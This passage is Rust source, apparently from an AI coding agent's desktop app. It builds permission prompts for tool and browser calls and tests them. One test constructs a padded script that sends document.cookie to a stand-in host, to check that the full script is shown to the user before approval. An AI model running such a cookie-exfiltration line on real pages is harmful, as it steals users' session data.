            format!("Allow Forge to edit {}?", file_name(&call.target))
        }
        ToolKind::Bash => "Allow Forge to run this command?".to_string(),
        ToolKind::Web => "Allow Forge to use the web?".to_string(),
        ToolKind::WebSearch => "Allow Forge to search the web?".to_string(),
        ToolKind::Read | ToolKind::Search => "Allow Forge to read this?".to_string(),
        // The browser's tools: what it would do there, and on what.
        ToolKind::Other if tool.starts_with(crate::browser::TOOL_PREFIX) => {
            let action = match &tool[crate::browser::TOOL_PREFIX.len()..] {
                "navigate" => "open a page",
                "state" | "text" | "html" => "read the page",
                "click" => "click",
                "type" => "type",
                "press" => "press a key",
                "select" => "choose an option",
                "hover" => "point at something",
                "scroll" => "scroll",
                "eval" => return (JS_ASK_TITLE.to_string(), s_or(input, "expression")),
                "wait" => "wait on the page",
                "screenshot" => "take a screenshot",
                "console" => "read the console",
                "tabs" => "list the tabs",
                "new_tab" => "open a new tab",
                "switch_tab" => "switch tabs",
                "close_tab" => "close a tab",
                "back" => "go back",
                "forward" => "go forward",
                "reload" => "reload the page",
                _ => "act",
            };
            // The whole subject: the row cuts it to a line, the ask doesn't.
            return (
                format!("Allow Forge to {action} in the browser?"),
                browser_subject(input)
                    .or_else(|| call.note.map(|n| n.to_string()))
                    .unwrap_or_else(|| "The page in the side panel".into()),
            );
        }
        ToolKind::Other => format!("Allow Forge to use {tool}?"),
    };
    (title, call.target.to_string())
}

fn s_or(input: &Value, key: &str) -> String {
    input[key]
        .as_str()
        .filter(|v| !v.trim().is_empty())
        .unwrap_or("The page in the side panel")
        .to_string()
}

fn file_name(path: &str) -> &str {
    path.rsplit(['/', '\\']).next().unwrap_or(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn parse(lines: &[Value]) -> Vec<Event> {
        let mut p = Parser::default();
        lines.iter().flat_map(|l| p.line(&l.to_string())).collect()
    }

    #[test]
    fn a_page_being_written_is_drafted_as_it_streams() {
        let delta = |i: u64, part: &str| json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_delta","index":i,"delta":{"type":"input_json_delta","partial_json":part}}});
        let start = |i: u64, name: &str| json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_start","index":i,"content_block":{"type":"tool_use","id":format!("w{i}"),"name":name,"input":{}}}});
        let mut p = Parser::default();
        let mut feed = |l: Value| p.line(&l.to_string());
        assert!(feed(start(1, "Write")).is_empty());
        // Nothing until the path is whole.
        assert!(feed(delta(1, r#"{"file_path": "site/deck.ht"#)).is_empty());
        let ev = feed(delta(1, r#"ml", "content": "<h1>Course"#));
        assert_eq!(
            ev,
            [Event::Drafting {
                id: "w1".into(),
                path: "site/deck.html".into(),
                content: "<h1>Course".into()
            }]
        );
        // Then at most every DRAFT_EVERY.
        assert!(feed(delta(1, " intro</h1>")).is_empty());
        // Not a page, not a Write, or a sub-agent's: no drafts.
        feed(start(2, "Write"));
        assert!(feed(delta(2, r#"{"file_path": "a.md", "content": "x"#)).is_empty());
        feed(start(3, "Bash"));
        assert!(feed(delta(3, r#"{"command": "ls"#)).is_empty());
        let nested = json!({"type":"stream_event","parent_tool_use_id":"t9","event":{"type":"content_block_start","index":4,"content_block":{"type":"tool_use","id":"w4","name":"Write","input":{}}}});
        feed(nested);
        assert!(feed(delta(4, r#"{"file_path": "b.html", "content": "x"#)).is_empty());
        // A finished block is forgotten.
        feed(json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_stop","index":1}}));
        assert!(!p.writes.contains_key(&1));
    }

    #[test]
    fn streamed_text_is_not_repeated_by_the_full_message() {
        let mut ev = parse(&[
            json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_start","index":0,"content_block":{"type":"text","text":""}}}),
            json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Hel"}}}),
            json!({"type":"stream_event","parent_tool_use_id":null,"event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"lo"}}}),
            json!({"type":"assistant","parent_tool_use_id":null,"message":{"content":[{"type":"text","text":"Hello"},{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"ls"}}]}}),
            json!({"type":"user","parent_tool_use_id":null,"message":{"content":[{"type":"tool_result","tool_use_id":"t1","content":[{"type":"text","text":"a\nb"}]}]}}),
            json!({"type":"result","is_error":false,"duration_ms":1500,"stop_reason":"end_turn","usage":{"input_tokens":10,"output_tokens":5}}),
        ]);
        assert_eq!(ev.remove(0), Event::Break);
        assert_eq!(ev[0], Event::Text("Hel".into()));
        assert_eq!(ev[1], Event::Text("lo".into()));
        assert!(matches!(&ev[2], Event::ToolUse { id, name, .. } if id == "t1" && name == "Bash"));
        assert_eq!(
            ev[3],
            Event::ToolResult {
                id: "t1".into(),
                output: "a\nb".into(),
                is_error: false,
            }
        );
        assert!(
            matches!(&ev[4], Event::TurnEnd { ms: 1500, usage: Some(u), error: None } if u.total() == 15)
        );
        assert_eq!(ev.len(), 5);
    }

    #[test]
    fn unstreamed_text_comes_from_the_full_message() {
        let ev = parse(&[
            json!({"type":"assistant","parent_tool_use_id":null,"message":{"content":[{"type":"text","text":"Hi"}]}}),
        ]);
        assert_eq!(ev, vec![Event::Break, Event::Text("Hi".into())]);
    }

    #[test]
    fn sub_agent_lines_become_its_steps_and_immediate_results_end_no_turn() {
        let ev = parse(&[
            json!({"type":"assistant","parent_tool_use_id":"task1","message":{"content":[
                {"type":"text","text":"inner"},
                {"type":"tool_use","id":"s1","name":"Read","input":{"file_path":"a.rs"}}]}}),
            json!({"type":"user","parent_tool_use_id":"task1","message":{"content":[
                {"type":"tool_result","tool_use_id":"s1","content":"x"}]}}),
            json!({"type":"result","immediate":true,"num_turns":0,"is_error":false,"result":"The answer.\n"}),
        ]);
        assert_eq!(
            ev,
            vec![
                Event::SubText {
                    parent: "task1".into(),
                    text: "inner".into()
                },
                Event::SubTool {
                    parent: "task1".into(),
                    id: "s1".into(),
                    name: "Read".into(),
                    input: json!({"file_path":"a.rs"})
                },
                Event::SubResult {
                    parent: "task1".into(),
                    id: "s1".into(),
                    is_error: false
                },
                Event::Immediate {
                    text: "The answer.".into(),
                    is_error: false
                }
            ]
        );
    }

    #[test]
    fn plans_are_answered_with_a_mode_or_kept() {
        let input = json!({"plan": "p"});
        let auto = plan_answer_line("r1", PlanChoice::AutoAcceptEdits, &input);
        let r = &auto["response"]["response"];
        assert_eq!(r["behavior"], "allow");
        assert_eq!(
            r["updatedPermissions"][0],
            json!({"type": "setMode", "mode": "acceptEdits", "destination": "session"})
        );
        let manual = plan_answer_line("r1", PlanChoice::ApproveEdits, &input);
        assert_eq!(
            manual["response"]["response"]["updatedPermissions"][0]["mode"],
            "default"
        );
        let keep = plan_answer_line("r1", PlanChoice::KeepPlanning, &input);
        assert_eq!(keep["response"]["response"]["behavior"], "deny");
        assert_eq!(ask_text("ExitPlanMode", &input).0, PLAN_ASK_TITLE);
        // ForgeCLI's mode changes reach the app.
        let ev = parse(&[
            json!({"type":"system","subtype":"status","status":null,"permissionMode":"acceptEdits"}),
        ]);
        assert_eq!(ev, vec![Event::ModeChanged("acceptEdits".into())]);
    }

    #[test]
    fn browser_asks_say_what_and_where() {
        let (title, detail) = ask_text(
            "mcp__forge-browser__navigate",
            &json!({"url": "https://example.com"}),
        );
        assert_eq!(title, "Allow Forge to open a page in the browser?");
        assert_eq!(detail, "https://example.com");
        let (title, detail) = ask_text("mcp__forge-browser__eval", &json!({}));
        assert_eq!(title, JS_ASK_TITLE);
        assert_eq!(detail, "The page in the side panel");
        // A long script is asked about whole, though its row shows a line.
        let script = format!(
            "(() => {{ {} return fetch('https://x.test/?c=' + document.cookie) }})()",
            "/* pad */ ".repeat(30)
        );
        let (_, detail) = ask_text("mcp__forge-browser__eval", &json!({ "expression": script }));
        assert_eq!(detail, script);
        let row = tool_call("mcp__forge-browser__eval", &json!({ "expression": script }));
        assert!(row.note.is_some_and(|n| n.ends_with('…')));
        let typed = "x".repeat(300);
        let (_, detail) = ask_text("mcp__forge-browser__type", &json!({ "text": typed }));
        assert_eq!(detail, typed);
    }

    #[test]
    fn permission_requests_and_errors() {
        let ev = parse(&[
            json!({"type":"control_request","request_id":"forge-req-1","request":{"subtype":"can_use_tool","tool_name":"Write","input":{"file_path":"/p/a.txt","content":"x"},"permission_suggestions":[{"type":"addRules"}]}}),
            json!({"type":"result","is_error":true,"stop_reason":"end_turn","duration_ms":3,"errors":["HTTP 401: bad key"]}),
            json!({"type":"result","is_error":true,"stop_reason":"interrupted","duration_ms":3}),
        ]);
        assert!(
            matches!(&ev[0], Event::Ask { request_id, tool_name, .. } if request_id == "forge-req-1" && tool_name == "Write")
        );
        assert!(matches!(&ev[1], Event::TurnEnd { error: Some(e), .. } if e.contains("401")));
        assert!(matches!(&ev[2], Event::TurnEnd { error: None, .. }));
    }

    #[test]
    fn answers_carry_the_input_and_always_carries_the_rules() {
        let input = json!({"command":"ls"});
        let sugg = json!([{"type":"addRules"}]);
        let a = answer_line("r1", true, true, &input, &sugg, None);
        assert_eq!(a["response"]["request_id"], "r1");
        assert_eq!(a["response"]["response"]["behavior"], "allow");
        assert_eq!(a["response"]["response"]["updatedInput"], input);
        assert_eq!(a["response"]["response"]["updatedPermissions"], sugg);
        let once = answer_line("r1", true, false, &input, &sugg, None);
        assert!(once["response"]["response"]
            .get("updatedPermissions")
            .is_none());
        assert_eq!(
            answer_line("r1", false, false, &input, &sugg, None)["response"]["response"]["behavior"],
            "deny"
        );
        // Denied with your words: Forge gets them, not just a no.
        let said = answer_line("r1", false, false, &input, &sugg, Some("Use lib.rs instead"));
        let message = said["response"]["response"]["message"].as_str().unwrap();
        assert!(message.contains("Use lib.rs instead"), "{message}");
    }

    #[test]
    fn the_endpoint_goes_in_variables_never_arguments() {
        let p: Profile = serde_json::from_value(json!({"name":"x","baseUrl":"https://gw.example/v1","wire":"anthropic","model":"m1","auth":{"type":"bearer","token":"${env:FORGE_GPUI_TEST_KEY}"}})).unwrap();
        std::env::set_var("FORGE_GPUI_TEST_KEY", "sk-test");
        let id = "0b9a1f2e-3c4d-4e5f-8a6b-7c8d9e0f1a2b";
        let l = launch(&p, ModeId::Manual, false, Conversation::New(id)).unwrap();
        assert!(l.args.windows(2).any(|w| w == ["--session-id", id]));
        let r = launch(&p, ModeId::Manual, false, Conversation::Resume(id)).unwrap();
        assert!(
            r.args.windows(2).any(|w| w == ["--resume", id])
                && !r.args.iter().any(|a| a == "--session-id")
        );
        assert!(!l.args.iter().any(|a| a.contains("sk-test")));
        assert!(l
            .env
            .contains(&("FORGE_BASE_URL".into(), "https://gw.example".into())));
        assert!(l.env.contains(&("FORGE_API_KEY".into(), "sk-test".into())));
        assert!(l.args.windows(2).any(|w| w == ["--model", "m1"]));
        assert!(l
            .args
            .windows(2)
            .any(|w| w == ["--permission-mode", "default"]));
        // The model is told Diagram Design is the default, and that a
        // format the user names (Mermaid, ASCII, ...) wins.
        let surface = l
            .args
            .windows(2)
            .find(|w| w[0] == "--append-system-prompt")
            .map(|w| w[1].clone())
            .unwrap();
        assert!(surface.contains("Diagram Design is the default"));
        assert!(surface.contains("unless the user names another format"));
        assert!(surface.contains("```mermaid") && surface.contains("ASCII"));
        // An HTML page is looked at, critiqued and revised, three rounds at most.
        assert!(surface.contains("When you write or change an HTML page"));
        assert!(surface.contains("use the design skill"));
        assert!(surface.contains("after three rounds"));
        let o: Profile = serde_json::from_value(
            json!({"name":"o","baseUrl":"http://127.0.0.1:11434","wire":"openai","model":"q"}),
        )
        .unwrap();
        let l = launch(&o, ModeId::Manual, false, Conversation::New(id)).unwrap();
        assert!(l.env.contains(&(
            "FORGE_OPENAI_BASE_URL".into(),
            "http://127.0.0.1:11434/v1".into()
        )));
    }

    #[test]
    fn tool_rows() {
        let c = tool_call(
            "Edit",
            &json!({"file_path":"src/a.rs","old_string":"a","new_string":"b\nc"}),
        );
        assert_eq!(c.kind, ToolKind::Edit);
        assert_eq!(c.diff.len(), 3);
        let c = tool_call("Grep", &json!({"pattern":"fn main","path":"src"}));
        assert_eq!(c.target.as_ref(), "fn main in src");
        assert_eq!(
            tool_call("Task", &json!({"description":"look"})).kind,
            ToolKind::Other
        );
    }
}
